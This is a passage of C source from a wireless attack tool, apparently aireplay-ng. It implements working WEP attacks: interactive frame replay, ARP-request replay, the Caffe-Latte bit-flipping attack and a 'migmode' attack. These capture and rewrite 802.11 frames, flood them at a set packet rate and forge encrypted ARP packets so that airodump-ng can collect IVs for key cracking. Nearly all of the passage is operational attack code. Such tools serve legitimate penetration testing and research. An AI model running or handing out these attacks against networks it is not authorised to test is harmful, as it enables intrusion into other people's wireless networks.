ESSID or WPA ?\\n\" );\n                        break;\n\n                    default:\n                        printf( \"Reassociation denied (code %d)\\n\", n );\n                        break;\n                    }\n\n                    sleep( 3 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                aid=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);\n                printf( \"Reassociation successful :-) (AID: %d)\\n\", aid );\n                deauth_wait = 3;\n                fflush( stdout );\n\n                tt = time( NULL );\n                tr = time( NULL );\n\n                state = 6;      /* reassoc. done */\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_interactive( void )\n{\n    int caplen, n, z;\n    int mi_b, mi_s, mi_d;\n    struct timeval tv;\n    struct timeval tv2;\n    float f, ticks[3];\n    unsigned char bssid[6];\n    unsigned char smac[6];\n    unsigned char dmac[6];\n\nread_packets:\n\n    if( capture_ask_packet( &caplen, 0 ) != 0 )\n        return( 1 );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n        z+=2;\n\n    /* rewrite the frame control & MAC addresses */\n\n    switch( h80211[1] & 3 )\n    {\n        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;\n        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;\n        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;\n        default: mi_b = 10; mi_d = 16; mi_s = 24; break;\n    }\n\n    if( memcmp( opt.r_bssid, NULL_MAC, 6 ) == 0 )\n        memcpy( bssid, h80211 + mi_b, 6 );\n    else\n        memcpy( bssid, opt.r_bssid, 6 );\n\n    if( memcmp( opt.r_smac , NULL_MAC, 6 ) == 0 )\n        memcpy( smac, h80211 + mi_s, 6 );\n    else\n        memcpy( smac, opt.r_smac, 6 );\n\n    if( memcmp( opt.r_dmac , NULL_MAC, 6 ) == 0 )\n        memcpy( dmac, h80211 + mi_d, 6 );\n    else\n        memcpy( dmac, opt.r_dmac, 6 );\n\n    if( opt.r_fctrl != -1 )\n    {\n        h80211[0] = opt.r_fctrl >>   8;\n        h80211[1] = opt.r_fctrl & 0xFF;\n\n        switch( h80211[1] & 3 )\n        {\n            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;\n            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;\n            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;\n            default: mi_b = 10; mi_d = 16; mi_s = 24; break;\n        }\n    }\n\n    memcpy( h80211 + mi_b, bssid, 6 );\n    memcpy( h80211 + mi_s, smac , 6 );\n    memcpy( h80211 + mi_d, dmac , 6 );\n\n    /* loop resending the packet */\n\n\t/* Check if airodump-ng is running. If not, print that message */\n    printf( \"You should also start airodump-ng to capture replies.\\n\\n\" );\n\n    signal( SIGINT, sighandler );\n    ctrl_c = 0;\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    nb_pkt_sent = 0;\n\n    while( 1 )\n    {\n        if( ctrl_c )\n            goto read_packets;\n\n        /* wait for the next timer interrupt, or sleep */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            /* we can't trust usleep, since it depends on the HZ */\n\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        /* update the status line */\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rSent %ld packets...(%d pps)\\33[K\\r\", nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)));\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION < 1 )\n            continue;\n\n        /* threshold reached */\n\n        ticks[2] = 0;\n\n        if( nb_pkt_sent == 0 )\n            ticks[0] = 0;\n\n        if( send_packet( h80211, caplen ) < 0 )\n            return( 1 );\n\n        if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )\n        {\n            if( send_packet( h80211, caplen ) < 0 )\n                return( 1 );\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_arp_resend( void )\n{\n    int nb_bad_pkt;\n    int arp_off1, arp_off2;\n    int i, n, caplen, nb_arp, z;\n    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;\n\n    time_t tc;\n    float f, ticks[3];\n    struct timeval tv;\n    struct timeval tv2;\n    struct tm *lt;\n\n    FILE *f_cap_out;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n    struct ARP_req * arp;\n\n    /* capture only WEP data to broadcast address */\n\n    opt.f_type    = 2;\n    opt.f_subtype = 0;\n    opt.f_iswep   = 1;\n\n    memset( opt.f_dmac, 0xFF, 6 );\n\n    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a source MAC (-h).\\n\" );\n        return( 1 );\n    }\n\n    if(getnet(NULL, 1, 1) != 0)\n        return 1;\n\n    /* create and write the output pcap header */\n\n    gettimeofday( &tv, NULL );\n\n    pfh_out.magic         = TCPDUMP_MAGIC;\n    pfh_out.version_major = PCAP_VERSION_MAJOR;\n    pfh_out.version_minor = PCAP_VERSION_MINOR;\n    pfh_out.thiszone      = 0;\n    pfh_out.sigfigs       = 0;\n    pfh_out.snaplen       = 65535;\n    pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n    lt = localtime( (const time_t *) &tv.tv_sec );\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_arp-%02d%02d-%02d%02d%02d.cap\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"Saving ARP requests in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = sizeof( struct pcap_file_header );\n\n    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\\n\" );\n        return( 1 );\n    }\n\n    fflush( f_cap_out );\n\n    printf( \"You should also start airodump-ng to capture replies.\\n\" );\n\n    if(opt.port_in <= 0)\n    {\n        /* avoid blocking on reading the socket */\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    if ( opt.ringbuffer )\n        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );\n    else\n        arp = (struct ARP_req*) malloc( sizeof( struct ARP_req ) );\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    tc = time( NULL ) - 11;\n\n    nb_pkt_read = 0;\n    nb_bad_pkt  = 0;\n    nb_ack_pkt  = 0;\n    nb_arp      = 0;\n    nb_arp_tot  = 0;\n    arp_off1    = 0;\n    arp_off2    = 0;\n\n    while( 1 )\n    {\n        /* sleep until the next clock tick */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rRead %ld packets (got %ld ARP requests and %ld ACKs), \"\n                    \"sent %ld packets...(%d pps)\\r\",\n                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)) );\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )\n        {\n            /* threshold reach, send one frame */\n\n            ticks[2] = 0;\n\n            if( nb_arp > 0 )\n            {\n                if( nb_pkt_sent == 0 )\n                    ticks[0] = 0;\n\n                if( send_packet( arp[arp_off1].buf,\n                                 arp[arp_off1].len ) < 0 )\n                    return( 1 );\n\n                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )\n                {\n                    if( send_packet( arp[arp_off1].buf,\n                                    arp[arp_off1].len ) < 0 )\n                        return( 1 );\n                }\n\n                if( ++arp_off1 >= nb_arp )\n                    arp_off1 = 0;\n            }\n        }\n\n        /* read a frame, and check if it's an ARP request */\n\n        if( opt.s_file == NULL )\n        {\n            gettimeofday( &tv, NULL );\n\n            caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n            if( caplen  < 0 ) return( 1 );\n            if( caplen == 0 ) continue;\n        }\n        else\n        {\n            n = sizeof( pkh );\n\n            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {\n                SWAP32( pkh.caplen );\n                SWAP32( pkh.len );\n            }\n\n            tv.tv_sec  = pkh.tv_sec;\n            tv.tv_usec = pkh.tv_usec;\n\n            n = caplen = pkh.caplen;\n\n            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )\n            {\n                printf( \"\\r\\33[KInvalid packet length %d.\\n\", n );\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )\n            {\n                /* remove the prism header */\n\n                if( h80211[7] == 0x40 )\n                    n = 64;\n                else\n                    n = *(int *)( h80211 + 4 );\n\n                if( n < 8 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )\n            {\n                /* remove the radiotap header */\n\n                n = *(unsigned short *)( h80211 + 2 );\n\n                if( n <= 0 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )\n            {\n                /* remove the PPI header */\n\n                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                /* for a while Kismet logged broken PPI headers */\n                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )\n                    n = 32;\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n        }\n\n        nb_pkt_read++;\n\n        /* check if it's a disassociation or deauthentication packet */\n\n        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&\n            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )\n        {\n            nb_bad_pkt++;\n\n            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )\n            {\n                printf( \"\\33[KNotice: got a deauth/disassoc packet. Is the \"\n                        \"source MAC associated ?\\n\" );\n\n                tc = time( NULL );\n                nb_bad_pkt = 0;\n            }\n        }\n\n        if( h80211[0] == 0xD4 &&\n            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )\n        {\n            nb_ack_pkt++;\n        }\n\n        /* check if it's a potential ARP request */\n\n        opt.f_minlen = opt.f_maxlen = 68;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n            goto add_arp;\n\n        opt.f_minlen = opt.f_maxlen = 86;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n        {\nadd_arp:\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            switch( h80211[1] & 3 )\n            {\n                case  1: /* ToDS */\n                {\n                    /* keep as a ToDS packet */\n\n                    memcpy( h80211 +  4, opt.f_bssid, 6 );\n                    memcpy( h80211 + 10, opt.r_smac,  6 );\n                    memcpy( h80211 + 16, opt.f_dmac,  6 );\n\n                    h80211[1] = 0x41;   /* ToDS & WEP  */\n                }\n                case  2: /* FromDS */\n                {\n                    if( opt.r_fromdsinj )\n                    {\n                        /* keep as a FromDS packet */\n\n                        memcpy( h80211 +  4, opt.f_dmac,  6 );\n                        memcpy( h80211 + 10, opt.f_bssid, 6 );\n                        memcpy( h80211 + 16, opt.r_smac,  6 );\n\n                        h80211[1] = 0x42;   /* FromDS & WEP  */\n                    }\n                    else\n                    {\n                        /* rewrite header to make it a ToDS packet */\n\n                        memcpy( h80211 +  4, opt.f_bssid, 6 );\n                        memcpy( h80211 + 10, opt.r_smac,  6 );\n                        memcpy( h80211 + 16, opt.f_dmac,  6 );\n\n                        h80211[1] = 0x41;   /* ToDS & WEP  */\n                    }\n                }\n            }\n\n            //should be correct already, keep qos/wds status\n//             h80211[0] = 0x08;   /* normal data */\n\n            /* if same IV, perhaps our own packet, skip it */\n\n            for( i = 0; i < nb_arp; i++ )\n            {\n                if( memcmp( h80211 + z, arp[i].buf + arp[i].hdrlen, 4 ) == 0 )\n                    break;\n            }\n\n            if( i < nb_arp )\n                continue;\n\n            if( caplen > 128)\n                continue;\n            /* add the ARP request in the ring buffer */\n\n            nb_arp_tot++;\n\n            /* Ring buffer size: by default: 8 ) */\n\n            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)\n            {\n                /* no more room, overwrite oldest entry */\n\n                memcpy( arp[arp_off2].buf, h80211, caplen );\n                arp[arp_off2].len = caplen;\n                arp[arp_off2].hdrlen = z;\n\n                if( ++arp_off2 >= nb_arp )\n                    arp_off2 = 0;\n            } else {\n\n                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {\n                    perror( \"malloc failed\" );\n                    return( 1 );\n                }\n\n                memcpy( arp[nb_arp].buf, h80211, caplen );\n                arp[nb_arp].len = caplen;\n                arp[nb_arp].hdrlen = z;\n                nb_arp++;\n\n                pkh.tv_sec  = tv.tv_sec;\n                pkh.tv_usec = tv.tv_usec;\n                pkh.caplen  = caplen;\n                pkh.len     = caplen;\n\n                n = sizeof( pkh );\n\n                if( fwrite( &pkh, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                n = pkh.caplen;\n\n                if( fwrite( h80211, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                fflush( f_cap_out );\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_caffe_latte( void )\n{\n    int nb_bad_pkt;\n    int arp_off1, arp_off2;\n    int i, n, caplen, nb_arp, z;\n    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;\n    unsigned char flip[4096];\n\n    time_t tc;\n    float f, ticks[3];\n    struct timeval tv;\n    struct timeval tv2;\n    struct tm *lt;\n\n    FILE *f_cap_out;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n    struct ARP_req * arp;\n\n    /* capture only WEP data to broadcast address */\n\n    opt.f_type    = 2;\n    opt.f_subtype = 0;\n    opt.f_iswep   = 1;\n    opt.f_fromds  = 0;\n\n    if(getnet(NULL, 1, 1) != 0)\n        return 1;\n\n    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a BSSID (-b).\\n\" );\n        return( 1 );\n    }\n    /* create and write the output pcap header */\n\n    gettimeofday( &tv, NULL );\n\n    pfh_out.magic         = TCPDUMP_MAGIC;\n    pfh_out.version_major = PCAP_VERSION_MAJOR;\n    pfh_out.version_minor = PCAP_VERSION_MINOR;\n    pfh_out.thiszone      = 0;\n    pfh_out.sigfigs       = 0;\n    pfh_out.snaplen       = 65535;\n    pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n    lt = localtime( (const time_t *) &tv.tv_sec );\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_arp-%02d%02d-%02d%02d%02d.cap\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"Saving ARP requests in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = sizeof( struct pcap_file_header );\n\n    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\\n\" );\n        return( 1 );\n    }\n\n    fflush( f_cap_out );\n\n    printf( \"You should also start airodump-ng to capture replies.\\n\" );\n\n    if(opt.port_in <= 0)\n    {\n        /* avoid blocking on reading the socket */\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    if ( opt.ringbuffer )\n        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );\n    else\n        arp = (struct ARP_req*) malloc( sizeof( struct ARP_req ) );\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    tc = time( NULL ) - 11;\n\n    nb_pkt_read = 0;\n    nb_bad_pkt  = 0;\n    nb_ack_pkt  = 0;\n    nb_arp      = 0;\n    nb_arp_tot  = 0;\n    arp_off1    = 0;\n    arp_off2    = 0;\n\n    while( 1 )\n    {\n        /* sleep until the next clock tick */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rRead %ld packets (%ld ARPs, %ld ACKs), \"\n                    \"sent %ld packets...(%d pps)\\r\",\n                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)) );\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )\n        {\n            /* threshold reach, send one frame */\n\n            ticks[2] = 0;\n\n            if( nb_arp > 0 )\n            {\n                if( nb_pkt_sent == 0 )\n                    ticks[0] = 0;\n\n                if( send_packet( arp[arp_off1].buf,\n                                 arp[arp_off1].len ) < 0 )\n                    return( 1 );\n\n                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )\n                {\n                    if( send_packet( arp[arp_off1].buf,\n                                    arp[arp_off1].len ) < 0 )\n                        return( 1 );\n                }\n\n                if( ++arp_off1 >= nb_arp )\n                    arp_off1 = 0;\n            }\n        }\n\n        /* read a frame, and check if it's an ARP request */\n\n        if( opt.s_file == NULL )\n        {\n            gettimeofday( &tv, NULL );\n\n            caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n            if( caplen  < 0 ) return( 1 );\n            if( caplen == 0 ) continue;\n        }\n        else\n        {\n            n = sizeof( pkh );\n\n            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {\n                SWAP32( pkh.caplen );\n                SWAP32( pkh.len );\n            }\n\n            tv.tv_sec  = pkh.tv_sec;\n            tv.tv_usec = pkh.tv_usec;\n\n            n = caplen = pkh.caplen;\n\n            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )\n            {\n                printf( \"\\r\\33[KInvalid packet length %d.\\n\", n );\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )\n            {\n                /* remove the prism header */\n\n                if( h80211[7] == 0x40 )\n                    n = 64;\n                else\n                    n = *(int *)( h80211 + 4 );\n\n                if( n < 8 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )\n            {\n                /* remove the radiotap header */\n\n                n = *(unsigned short *)( h80211 + 2 );\n\n                if( n <= 0 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )\n            {\n                /* remove the PPI header */\n\n                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                /* for a while Kismet logged broken PPI headers */\n                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )\n                    n = 32;\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n        }\n\n        nb_pkt_read++;\n\n        /* check if it's a disas. or deauth packet */\n\n        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&\n            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )\n        {\n            nb_bad_pkt++;\n\n            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )\n            {\n                printf( \"\\33[KNotice: got a deauth/disassoc packet. Is the \"\n                        \"source MAC associated ?\\n\" );\n\n                tc = time( NULL );\n                nb_bad_pkt = 0;\n            }\n        }\n\n        if( h80211[0] == 0xD4 &&\n            ! memcmp( h80211 + 4, opt.f_bssid, 6 ) )\n        {\n            nb_ack_pkt++;\n        }\n\n        /* check if it's a potential ARP request */\n\n        opt.f_minlen = opt.f_maxlen = 68;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n            goto add_arp;\n\n        opt.f_minlen = opt.f_maxlen = 86;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n        {\nadd_arp:\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            switch( h80211[1] & 3 )\n            {\n                case  0: /* ad-hoc */\n                {\n                    if(memcmp(h80211 + 16, BROADCAST, 6) == 0)\n                    {\n                        /* rewrite to an ad-hoc packet */\n\n                        memcpy( h80211 +  4, BROADCAST, 6 );\n                        memcpy( h80211 + 10, opt.r_smac,  6 );\n                        memcpy( h80211 + 16, opt.f_bssid,  6 );\n\n                        h80211[1] = 0x40;   /* WEP  */\n                    }\n                    else\n                    {\n                        nb_arp_tot++;\n                        continue;\n                    }\n\n                    break;\n                }\n                case  1: /* ToDS */\n                {\n                    if(memcmp(h80211 + 16, BROADCAST, 6) == 0)\n                    {\n                        /* rewrite to a FromDS packet */\n\n                        memcpy( h80211 +  4, BROADCAST, 6 );\n                        memcpy( h80211 + 10, opt.f_bssid,  6 );\n                        memcpy( h80211 + 16, opt.f_bssid,  6 );\n\n                        h80211[1] = 0x42;   /* ToDS & WEP  */\n                    }\n                    else\n                    {\n                        nb_arp_tot++;\n                        continue;\n                    }\n\n                    break;\n                }\n                default:\n                    continue;\n            }\n\n//             h80211[0] = 0x08;   /* normal data */\n\n            /* if same IV, perhaps our own packet, skip it */\n\n            for( i = 0; i < nb_arp; i++ )\n            {\n                if( memcmp( h80211 + z, arp[i].buf + arp[i].hdrlen, 4 ) == 0 )\n                    break;\n            }\n\n            if( i < nb_arp )\n                continue;\n\n            if( caplen > 128)\n                continue;\n            /* add the ARP request in the ring buffer */\n\n            nb_arp_tot++;\n\n            /* Ring buffer size: by default: 8 ) */\n\n            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)\n                continue;\n            else {\n\n                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {\n                    perror( \"malloc failed\" );\n                    return( 1 );\n                }\n\n                memset(flip, 0, 4096);\n\n//                 flip[49-24-4] ^= ((rand() % 255)+1); //flip random bits in last byte of sender MAC\n//                 flip[53-24-4] ^= ((rand() % 255)+1); //flip random bits in last byte of sender IP\n                flip[z+21] ^= ((rand() % 255)+1); //flip random bits in last byte of sender MAC\n                flip[z+25] ^= ((rand() % 255)+1); //flip random bits in last byte of sender IP\n\n                add_crc32_plain(flip, caplen-z-4-4);\n                for(i=0; i<caplen-z-4; i++)\n                    (h80211+z+4)[i] ^= flip[i];\n\n                memcpy( arp[nb_arp].buf, h80211, caplen );\n                arp[nb_arp].len = caplen;\n                arp[nb_arp].hdrlen = z;\n                nb_arp++;\n\n                pkh.tv_sec  = tv.tv_sec;\n                pkh.tv_usec = tv.tv_usec;\n                pkh.caplen  = caplen;\n                pkh.len     = caplen;\n\n                n = sizeof( pkh );\n\n                if( fwrite( &pkh, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                n = pkh.caplen;\n\n                if( fwrite( h80211, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                fflush( f_cap_out );\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_migmode( void )\n{\n    int nb_bad_pkt;\n    int arp_off1, arp_off2;\n    int i, n, caplen, nb_arp, z;\n    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;\n    unsigned char flip[4096];\n    unsigned char senderMAC[6];\n\n    time_t tc;\n    float f, ticks[3];\n    struct timeval tv;\n    struct timeval tv2;\n    struct tm *lt;\n\n    FILE *f_cap_out;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n    struct ARP_req * arp;\n\n    if ( opt.ringbuffer )\n        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );\n    else\n        arp = (struct ARP_req*) malloc( sizeof( struct ARP_req ) );\n\n    /* capture only WEP data to broadcast address */\n\n    opt.f_type    = 2;\n    opt.f_subtype = 0;\n    opt.f_iswep   = 1;\n    opt.f_fromds  = 1;\n\n    if(getnet(NULL, 1, 1) != 0)\n        return 1;\n\n    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a BSSID (-b).\\n\" );\n        return( 1 );\n    }\n    /* create and write the output pcap header */\n\n    gettimeofday( &tv, NULL );\n\n    pfh_out.magic         = TCPDUMP_MAGIC;\n    pfh_out.version_major = PCAP_VERSION_MAJOR;\n    pfh_out.version_minor = PCAP_VERSION_MINOR;\n    pfh_out.thiszone      = 0;\n    pfh_out.sigfigs       = 0;\n    pfh_out.snaplen       = 65535;\n    pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n    lt = localtime( (const time_t *) &tv.tv_sec );\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_arp-%02d%02d-%02d%02d%02d.cap\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"Saving ARP requests in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = sizeof( struct pcap_file_header );\n\n    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\\n\" );\n        return( 1 );\n    }\n\n    fflush( f_cap_out );\n\n    printf( \"You should also start airodump-ng to capture replies.\\n\" );\n    printf( \"Remember to filter the capture to only keep WEP frames: \");\n    printf( \" \\\"tshark -R 'wlan.wep.iv' -r capture.cap -w outcapture.cap\\\"\\n\");\n    //printf( \"Remember to filter the capture to keep only broadcast From-DS frames.\\n\");\n\n    if(opt.port_in <= 0)\n    